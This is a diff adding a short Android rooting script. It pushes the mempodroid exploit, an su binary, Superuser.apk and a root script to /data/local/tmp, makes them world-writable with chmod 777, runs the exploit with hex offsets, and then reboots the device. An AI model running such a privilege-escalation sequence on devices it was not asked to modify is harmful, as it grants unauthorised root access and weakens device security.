@@ -1,0 +1,30 @@
+$ECHO Pushing Mempodroid exploit
+push "$ZIPFILEmempodroid" /data/local/tmp/mempodroid
+$ECHO Pushing Switch User binary
+push "$ZIPFILEsu" /data/local/tmp/su
+$ECHO Pushing Superuser.apk
+push "$ZIPFILESuperuser.apk" /data/local/tmp/Superuser.apk
+$ECHO Pushing root script
+push "$ZIPFILErootGN.sh" /data/local/tmp/rootGN.sh
+
+$ECHO executing root exploit
+shell chmod 777 /data/local/tmp/mempodroid
+shell chmod 777 /data/local/tmp/rootGN.sh
+shell /data/local/tmp/mempodroid 0xd7f4 0xad4b /data/local/tmp/rootGN.sh
+$ECHO rebooting system
+
+reboot
+$ECHO done....
+
+
+
+
+
+
+
+
+
+
+
+
+
